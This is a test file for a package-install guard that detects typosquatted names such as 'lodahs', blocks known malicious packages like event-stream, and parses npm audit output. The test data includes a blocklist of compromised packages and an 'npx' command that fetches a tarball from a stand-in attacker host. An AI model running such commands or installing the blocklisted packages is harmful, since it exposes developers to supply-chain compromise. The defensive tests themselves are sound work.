import { test } from "node:test"
import assert from "node:assert/strict"
import { parseInstallCommand, levenshtein, isTyposquat, checkInstall, parseAuditReport, BLOCKED_PACKAGES } from "../src/deps.ts"
import { resolveConfig } from "../src/config.ts"

// --- parseInstallCommand ---

test("parse: npm install basic forms", () => {
  assert.deepEqual(parseInstallCommand("npm install lodash"), {
    manager: "npm",
    packages: [{ name: "lodash", version: undefined }],
  })
  assert.deepEqual(parseInstallCommand("npm i a b"), {
    manager: "npm",
    packages: [{ name: "a", version: undefined }, { name: "b", version: undefined }],
  })
  assert.deepEqual(parseInstallCommand("npm install pkg@1.2.3"), {
    manager: "npm",
    packages: [{ name: "pkg", version: "1.2.3" }],
  })
})

test("parse: scoped names and versions", () => {
  assert.deepEqual(parseInstallCommand("npm i @scope/pkg"), {
    manager: "npm",
    packages: [{ name: "@scope/pkg", version: undefined }],
  })
  assert.deepEqual(parseInstallCommand("npm i @scope/pkg@1.0.0"), {
    manager: "npm",
    packages: [{ name: "@scope/pkg", version: "1.0.0" }],
  })
})

test("parse: flags skipped, env prefix ok, no packages -> null", () => {
  assert.deepEqual(parseInstallCommand("npm i -D pkg"), {
    manager: "npm",
    packages: [{ name: "pkg", version: undefined }],
  })
  assert.equal(parseInstallCommand("npm install"), null)
  assert.equal(parseInstallCommand("npm ci"), null)
  assert.deepEqual(parseInstallCommand("FOO=bar npm i pkg"), {
    manager: "npm",
    packages: [{ name: "pkg", version: undefined }],
  })
})

test("parse: global installs are out of scope", () => {
  assert.equal(parseInstallCommand("npm install -g pkg"), null)
  assert.equal(parseInstallCommand("npm install --global pkg"), null)
})

test("parse: non-install commands -> null", () => {
  assert.equal(parseInstallCommand("npm run build"), null)
  assert.equal(parseInstallCommand("npm run install:all"), null)
  assert.equal(parseInstallCommand("curl -s https://registry.npmjs.org"), null)
  assert.equal(parseInstallCommand("git clone https://github.com/x/y"), null)
})

test("parse: pip and cargo", () => {
  assert.deepEqual(parseInstallCommand("pip install requests==2.31.0"), {
    manager: "pip",
    packages: [{ name: "requests", version: "2.31.0" }],
  })
  assert.deepEqual(parseInstallCommand("pip3 install flask>=2.0"), {
    manager: "pip",
    packages: [{ name: "flask", version: "2.0" }],
  })
  assert.deepEqual(parseInstallCommand("cargo add serde"), {
    manager: "cargo",
    packages: [{ name: "serde", version: undefined }],
  })
})

// --- levenshtein ---

test("levenshtein unit checks", () => {
  assert.equal(levenshtein("abc", "abc"), 0)
  assert.equal(levenshtein("abc", "abd"), 1)
  assert.equal(levenshtein("abc", "ab"), 1)
  assert.equal(levenshtein("kitten", "sitting"), 3)
  assert.equal(levenshtein("lodash", "lodahs"), 1)
})

// --- typosquat ---

test("typosquat: distance-1 to a top name", () => {
  assert.equal(isTyposquat("lodahs"), "lodash")
  assert.equal(isTyposquat("reactt"), "react")
  assert.equal(isTyposquat("axio"), "axios")
})

test("typosquat: clean names", () => {
  assert.equal(isTyposquat("lodash"), null)
  assert.equal(isTyposquat("my-own-pkg-123"), null)
  assert.equal(isTyposquat("moment-js"), null) // distance > 1
})

// --- blocklist ---

test("blocklist: known malicious packages detected, case-insensitive", () => {
  assert.ok(BLOCKED_PACKAGES.has("event-stream"))
  const v = checkInstall("npm install event-stream")
  assert.equal(v?.reason, "blocklist")
  assert.equal(v?.name, "event-stream")
  const v2 = checkInstall("npm install EVENT-STREAM")
  assert.equal(v2?.reason, "blocklist")
})

test("checkInstall: typosquat verdict names the target", () => {
  const v = checkInstall("npm install lodahs")
  assert.equal(v?.reason, "typosquat")
  assert.equal(v?.target, "lodash")
})

test("checkInstall: clean commands -> null", () => {
  assert.equal(checkInstall("npm install lodash"), null)
  assert.equal(checkInstall("npm test"), null)
  assert.equal(checkInstall("pip install requests"), null)
})

test("checkInstall: user blockedPackages extend the built-in list", () => {
  const cfg = resolveConfig({ blockedPackages: ["my-internal-banned"] })
  const v = checkInstall("npm install my-internal-banned", cfg.blockedPackages)
  assert.equal(v?.reason, "blocklist")
})

// --- config ---

test("config: depsCheck default true, disable works, blockedPackages parsed", () => {
  assert.equal(resolveConfig({}).depsCheck, true)
  assert.equal(resolveConfig({ depsCheck: false }).depsCheck, false)
  assert.deepEqual(resolveConfig({ blockedPackages: ["a", "b"] }).blockedPackages, ["a", "b"])
  assert.deepEqual(resolveConfig({}).blockedPackages, [])
  assert.deepEqual(resolveConfig({ allowedPackages: ["rc"] }).allowedPackages, ["rc"])
  assert.deepEqual(resolveConfig({}).allowedPackages, [])
})

// --- review pass 1 regressions ---

test("C1: compound commands are scanned segment by segment", () => {
  assert.equal(checkInstall("cd proj && npm install event-stream")?.reason, "blocklist")
  assert.equal(checkInstall("cat x | npm install lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("echo hi; npm install event-stream")?.reason, "blocklist")
  assert.equal(checkInstall("sudo -E npm install event-stream")?.reason, "blocklist")
  assert.equal(checkInstall("sudo -u root npm install lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("env FOO=bar npm install event-stream")?.reason, "blocklist")
})

test("M1: flag operands are not package names", () => {
  assert.equal(checkInstall("npm install --prefix rc lodash"), null)
  assert.equal(checkInstall("pip install -r rc"), null)
  assert.equal(checkInstall("npm i lodash -w app"), null)
  assert.equal(checkInstall("pip install -r requirements.txt"), null)
})

test("M2: registry names are case-insensitive — Lodash is not a squat", () => {
  assert.equal(checkInstall("npm i Lodash"), null)
  assert.equal(checkInstall("npm i LODASH"), null)
})

test("multi-package commands: second package violations caught", () => {
  assert.equal(checkInstall("npm install qs event-stream")?.name, "event-stream")
  assert.equal(checkInstall("npm install qs lodahs")?.target, "lodash")
  assert.equal(checkInstall("npm install qs && npm install coa")?.name, "coa")
})

test("quoted and local/git specs are handled", () => {
  assert.equal(checkInstall('npm install "event-stream"')?.reason, "blocklist")
  assert.equal(checkInstall("npm install ./local-dir"), null)
  assert.equal(checkInstall("npm install github:user/repo"), null)
  assert.equal(checkInstall("npm install ../event-stream"), null)
})

test("known gaps pinned: dry-run blocked; npx and @types covered since 2.5; arbitrary scopes remain", () => {
  // --dry-run still blocks (nothing installs, but we keep it simple and safe)
  assert.equal(checkInstall("npm install lodahs --dry-run")?.reason, "typosquat")
  // npx executes packages without install — covered since phase 2.5
  assert.equal(checkInstall("npx lodahs")?.reason, "typosquat")
  // @types scoped names squat-checked since phase 2.5
  assert.equal(checkInstall("npm i @types/lodahs")?.reason, "typosquat")
  // arbitrary scoped names are still not squat-checked — phase 3
  assert.equal(checkInstall("npm i @scope/lodahs"), null)
})

test("allowedPackages exempts from the blocklist", () => {
  assert.equal(checkInstall("npm install rc", [], ["rc"]), null)
  assert.equal(checkInstall("npm install rc", [], ["RC"]), null)
})

test("pip/cargo go through the blocklist (no squat check)", () => {
  assert.equal(checkInstall("pip install event-stream")?.reason, "blocklist")
  assert.equal(checkInstall("pip install requests"), null) // legit, no squat outside npm
  assert.equal(checkInstall("cargo add serde"), null)
})

// --- review of live dogfood (npm-published 1.0.0): Windows manager suffixes ---

test("Windows: npm.cmd / pnpm.cmd / yarn.cmd / pip.exe are recognized as managers", () => {
  assert.equal(checkInstall("npm.cmd install lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("npm.cmd install event-stream")?.reason, "blocklist")
  assert.equal(checkInstall("pnpm.cmd add lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("yarn.cmd add event-stream")?.reason, "blocklist")
  assert.equal(checkInstall("pip.exe install event-stream")?.reason, "blocklist")
  assert.equal(checkInstall("npm.cmd install lodash"), null)
  assert.equal(checkInstall("npm.cmd test"), null)
})

// --- phase 2.5: npx / dlx interception ---

test("npx: positional package is checked (squat + blocklist)", () => {
  assert.equal(checkInstall("npx lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("npx lodahs")?.target, "lodash")
  assert.equal(checkInstall("npx -y lodahs@1.2.3")?.reason, "typosquat")
  assert.equal(checkInstall("npx --yes event-stream")?.reason, "blocklist")
  assert.equal(checkInstall("npx lodash"), null)
  assert.equal(checkInstall("npx node script.js"), null) // system binary, not a squat
})

test("npx: -p/--package operands are packages", () => {
  assert.equal(checkInstall("npx -p event-stream node x.js")?.reason, "blocklist")
  assert.equal(checkInstall("npx -p lodahs somebin")?.reason, "typosquat")
  assert.equal(checkInstall("npx --package lodash node x.js"), null)
})

test("npx: tokens after -- are command args, not packages", () => {
  assert.equal(checkInstall("npx -- lodahs"), null)
  assert.equal(checkInstall("npx -y -- lodahs@1.0.0"), null)
})

test("npx: windows suffix and git specs", () => {
  assert.equal(checkInstall("npx.cmd lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("npx github:user/repo"), null)
  assert.equal(checkInstall("npx https://evil.example/pkg.tgz"), null)
})

test("dlx: pnpm/yarn dlx checked", () => {
  assert.equal(checkInstall("pnpm dlx lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("yarn dlx event-stream")?.reason, "blocklist")
  assert.equal(checkInstall("pnpm dlx lodash"), null)
  assert.equal(checkInstall("pnpm.cmd dlx lodahs")?.reason, "typosquat")
})

// --- phase 2.5: @types scoped squatting ---

test("@types scoped squat: basename distance-1 to a top name", () => {
  assert.equal(checkInstall("npm i @types/lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("npm i @types/lodahs")?.target, "lodash")
  assert.equal(checkInstall("npm i @types/reactt")?.target, "react")
})

test("@types scoped squat: exact and foreign scopes untouched", () => {
  assert.equal(checkInstall("npm i @types/lodash"), null)
  assert.equal(checkInstall("npm i @types/react"), null)
  assert.equal(checkInstall("npm i @scope/lodahs"), null) // arbitrary scopes: phase 3
  assert.equal(checkInstall("npm i @types/lodash-es"), null) // trusted basename
})

// --- phase 2.5: affix squatting ---

test("affix squat: trusted + dictionary affix", () => {
  assert.equal(checkInstall("npm i lodashjs")?.target, "lodash")
  assert.equal(checkInstall("npm i node-lodash")?.target, "lodash")
  assert.equal(checkInstall("npm i react-cli")?.target, "react")
  assert.equal(checkInstall("npm i axiosjs")?.target, "axios")
  assert.equal(checkInstall("npm i lodash-js")?.target, "lodash")
})

test("affix squat: allowlist and trusted names untouched", () => {
  assert.equal(checkInstall("npm i angularjs"), null)
  assert.equal(checkInstall("npm i reactjs"), null)
  assert.equal(checkInstall("npm i vuejs"), null)
  assert.equal(checkInstall("npm i expressjs"), null)
  assert.equal(checkInstall("npm i nodejs"), null)
  assert.equal(checkInstall("npm i lodash-es"), null) // in TRUSTED_TOP itself
  assert.equal(checkInstall("npm i nodemailer"), null) // not an affix of a trusted name
  assert.equal(checkInstall("npm i mongoose"), null) // contains 'mongo'? not trusted; dist check only
  assert.equal(checkInstall("npm i vue-cli"), null) // official legacy Vue CLI (allowlist)
  assert.equal(checkInstall("npm i angular-cli"), null) // official legacy Angular CLI (allowlist)
})

// --- phase 2.5: versioned blocklist ---

test("versioned blocklist: name@version blocks only that version", () => {
  // colors is NOT in the built-in name-wide list — clean fixture for versioned-only blocking
  const blocked = ["colors@1.4.44"]
  assert.equal(checkInstall("npm i colors@1.4.44", blocked)?.reason, "blocklist")
  assert.equal(checkInstall("npm i colors", blocked), null)
  assert.equal(checkInstall("npm i colors@1.4.0", blocked), null)
  assert.equal(checkInstall("npm i colors@1.4.44 --save-dev", blocked)?.reason, "blocklist")
})

test("versioned blocklist: scoped and case-insensitive", () => {
  const blocked = ["@Scope/Pkg@1.0.0"]
  assert.equal(checkInstall("npm i @scope/pkg@1.0.0", blocked)?.reason, "blocklist")
  assert.equal(checkInstall("npm i @scope/pkg@1.0.1", blocked), null)
  assert.equal(checkInstall("npm i @scope/pkg", blocked), null)
})

test("versioned allow: wide allow lifts everything; versioned allow lifts only versioned blocks", () => {
  // colors is not built-in blocked — clean fixture
  assert.equal(checkInstall("npm i colors@1.4.44", ["colors@1.4.44"], ["colors"]), null)
  assert.equal(checkInstall("npm i colors@1.4.44", ["colors@1.4.44"], ["colors@1.4.44"]), null)
  // M-1: versioned allow must NOT lift a NAME-WIDE block (rc is blocked wide by the built-in list)
  assert.equal(checkInstall("npm i rc@1.2.9", ["rc@1.2.9"], ["rc@1.2.9"])?.reason, "blocklist")
  assert.equal(
    checkInstall("npm i colors@1.4.44", ["colors", "colors@1.4.44"], ["colors@1.4.44"])?.reason,
    "blocklist"
  )
  // wide allow still lifts everything for that name
  assert.equal(checkInstall("npm i rc@1.2.9", [], ["rc"]), null)
})

// --- phase 2.5: parseAuditReport ---

const AUDIT_V2 = {
  auditReport: {
    vulnerabilities: {
      "some-pkg": { severity: "critical", via: [{}] },
      "other-pkg": { severity: "critical", via: [{}] },
      "third-pkg": { severity: "high", via: [{}] },
    },
  },
}

const AUDIT_V1 = {
  advisories: {
    "101": { severity: "high" },
    "102": { severity: "moderate" },
  },
}

test("parseAuditReport: v2 shape aggregated by severity", () => {
  const r = parseAuditReport(JSON.stringify(AUDIT_V2))
  assert.deepEqual(r, { total: 3, severities: { critical: 2, high: 1 } })
})

test("parseAuditReport: v1 shape, garbage and empty report", () => {
  assert.deepEqual(parseAuditReport(JSON.stringify(AUDIT_V1)), {
    total: 2,
    severities: { high: 1, moderate: 1 },
  })
  assert.equal(parseAuditReport("not json"), null)
  assert.equal(parseAuditReport("{}"), null)
  assert.deepEqual(parseAuditReport(JSON.stringify({ auditReport: { vulnerabilities: {} } })), {
    total: 0,
    severities: {},
  })
})

test("parseAuditReport: npm>=11 top-level vulnerabilities shape", () => {
  const v3 = {
    auditReportVersion: 3,
    vulnerabilities: {
      lodash: { name: "lodash", severity: "critical", isDirect: true, via: [{}] },
      json5: { name: "json5", severity: "high", isDirect: false, via: [{}] },
    },
    metadata: { vulnerabilities: { total: 2 } },
  }
  const r = parseAuditReport(JSON.stringify(v3))
  assert.deepEqual(r, { total: 2, severities: { critical: 1, high: 1 } })
})

// --- review pass 1 regressions (phase 2.5) ---

test("M-2: pnpx (pnpm <=6 executor) is recognized", () => {
  assert.equal(checkInstall("pnpx lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("pnpx.cmd lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("pnpx lodash"), null)
})

test("npx forms: --package=, multiple -p, empty, -c", () => {
  assert.equal(checkInstall("npx --package=lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("npx -p lodahs -p event-stream run")?.reason, "typosquat")
  assert.equal(checkInstall("npx -y"), null)
  assert.equal(checkInstall("npx -c \"echo hi\""), null)
  assert.equal(checkInstall("npx -p lodash -c \"echo hi\""), null)
  assert.equal(checkInstall("npx -y -p lodash create-vite app"), null)
  assert.equal(checkInstall("npx pkg@1.2.3 --flag value"), null)
})

test("m-5: hostile severity strings fold into unknown", () => {
  const bad = {
    auditReport: {
      vulnerabilities: {
        a: { severity: "__proto__" },
        b: { severity: "constructor" },
        c: { severity: "critical" },
      },
    },
  }
  const r = parseAuditReport(JSON.stringify(bad))
  assert.equal(r?.total, 3)
  assert.equal(Object.prototype.hasOwnProperty.call(r?.severities ?? {}, "__proto__"), false)
  assert.equal(Object.prototype.hasOwnProperty.call(r?.severities ?? {}, "constructor"), false)
  assert.equal(r?.severities.unknown, 2)
  assert.equal(r?.severities.critical, 1)
})

test("m-9: versioned blocklist matching is literal", () => {
  const blocked = ["colors@latest"]
  assert.equal(checkInstall("npm i colors@latest", blocked)?.reason, "blocklist")
  assert.equal(checkInstall("npm i colors@1.2.0", blocked), null)
  // no semver interpretation: ^1.2.0 does not match a 1.2.0 entry
  assert.equal(checkInstall("npm i colors@^1.4.0", ["colors@1.4.0"]), null)
})

test("splitNameVersion edges: empty version is wide, double-@ splits on the last one", () => {
  // "rc@" — empty version parses as the wide name on both sides: consistent, blocks
  assert.equal(checkInstall("npm i rc", ["rc@"])?.reason, "blocklist")
  // symmetric with an odd install token: <REDACTED:credential> pkg@1.2.3, version garbage
  assert.equal(checkInstall("npm i pkg@1.2.3@garbage", ["pkg@1.2.3@garbage"])?.reason, "blocklist")
})

test("affix FP regression set: real npm names stay clean", () => {
  for (const name of [
    "fs-extra", "cross-env", "chart.js", "core-js", "react-dom", "socket.io",
    "axios-retry", "whatwg-fetch", "node-fetch", "vue-router", "nodemailer", "date-fns",
  ]) {
    assert.equal(checkInstall(`npm i ${name}`), null, `${name} must be clean`)
  }
})

test("m-8 pinned: pnpm dlx --package=x is treated as a package (conservative)", () => {
  assert.equal(checkInstall("pnpm dlx --package=lodahs run")?.reason, "typosquat")
})

test("isNpmInstall: drives the post-audit scheduler", async () => {
  const { isNpmInstall } = await import("../src/deps.ts")
  assert.equal(isNpmInstall("npm install lodash"), true)
  assert.equal(isNpmInstall("npm.cmd i lodash"), true)
  assert.equal(isNpmInstall("cd x && npm install lodash"), true)
  assert.equal(isNpmInstall("npx lodash"), false)
  assert.equal(isNpmInstall("pnpm dlx lodash"), false)
  assert.equal(isNpmInstall("npm test"), false)
  assert.equal(isNpmInstall("pip install requests"), false)
})

// --- review pass 2 regressions ---

test("N-1: manager token is case-insensitive (Windows FS is not)", () => {
  assert.equal(checkInstall("NPM INSTALL lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("PnPX lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("Npm.CMD install event-stream")?.reason, "blocklist")
})

test("N-2: single ampersand separates segments (cmd.exe)", () => {
  assert.equal(checkInstall("echo x & npm install lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("echo x & npm install event-stream")?.reason, "blocklist")
  assert.equal(checkInstall("echo x & echo y"), null)
})

test("N-3: npx -p=package form", () => {
  assert.equal(checkInstall("npx -p=lodahs run")?.reason, "typosquat")
  assert.equal(checkInstall("npx -p=lodash run"), null)
})

test("N-4: global flags before the subcommand", () => {
  assert.equal(checkInstall("npm --prefix . install event-stream")?.reason, "blocklist")
  assert.equal(checkInstall("yarn --cwd proj add lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("pnpm -C proj add lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("npm --prefix . install lodash"), null)
  assert.equal(checkInstall("npm -g install lodahs"), null) // global out of scope even first
})

test("N-5: pip extras are stripped before the blocklist", () => {
  assert.equal(checkInstall("pip install event-stream[socks]")?.reason, "blocklist")
  assert.equal(checkInstall("pip install requests[socks]"), null)
})

test("N-6: bun add / bunx / bun x covered", () => {
  assert.equal(checkInstall("bun add lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("bun install event-stream")?.reason, "blocklist")
  assert.equal(checkInstall("bunx lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("bun x lodahs")?.reason, "typosquat")
  assert.equal(checkInstall("bun add lodash"), null)
})

test("N-7: npm alias pulls the aliased package through the blocklist", () => {
  assert.equal(checkInstall("npm i alias@npm:event-stream")?.reason, "blocklist")
  assert.equal(checkInstall("npm i alias@npm:lodash"), null)
})

test("N-11: corrupted audit shapes do not produce phantom counts", () => {
  // array instead of object
  assert.equal(parseAuditReport(JSON.stringify({ auditReport: { vulnerabilities: [1, 2] } })), null)
  // non-object entries skipped
  const r = parseAuditReport(
    JSON.stringify({ auditReport: { vulnerabilities: { a: null, b: "x", c: { severity: "high" } } } })
  )
  assert.deepEqual(r, { total: 1, severities: { high: 1 } })
})

// --- post-audit dir resolution ---

test("extractNpmPrefix: finds the audit target dir", async () => {
  const { extractNpmPrefix } = await import("../src/deps.ts")
  assert.equal(extractNpmPrefix("npm install lodash --prefix /srv/app"), "/srv/app")
  assert.equal(extractNpmPrefix("npm install lodash --prefix=/srv/app"), "/srv/app")
  assert.equal(extractNpmPrefix("npm --prefix /srv/app install lodash"), "/srv/app")
  assert.equal(extractNpmPrefix("npm install lodash"), undefined)
  assert.equal(extractNpmPrefix("echo x & npm install lodash --prefix rel/dir"), "rel/dir")
})

test("expandShellVars: $env:NAME, %NAME% and ~ resolve against the environment", async () => {
  const { expandShellVars } = await import("../src/deps.ts")
  process.env.GUARD_TEST_DIR = "/tmp/guard-test"
  try {
    assert.equal(expandShellVars("$env:GUARD_TEST_DIR"), "/tmp/guard-test")
    assert.equal(expandShellVars("%GUARD_TEST_DIR%"), "/tmp/guard-test")
    assert.equal(expandShellVars("$env:GUARD_TEST_DIR\\sub"), "/tmp/guard-test\\sub") // inline form expands too
    assert.equal(expandShellVars("%NO_SUCH_GUARD_VAR%"), "%NO_SUCH_GUARD_VAR%")
    assert.equal(expandShellVars("/plain/path"), "/plain/path")
    const h = expandShellVars("~")
    assert.ok(h.length > 2, "~ expands to a home path")
  } finally {
    delete process.env.GUARD_TEST_DIR
  }
})
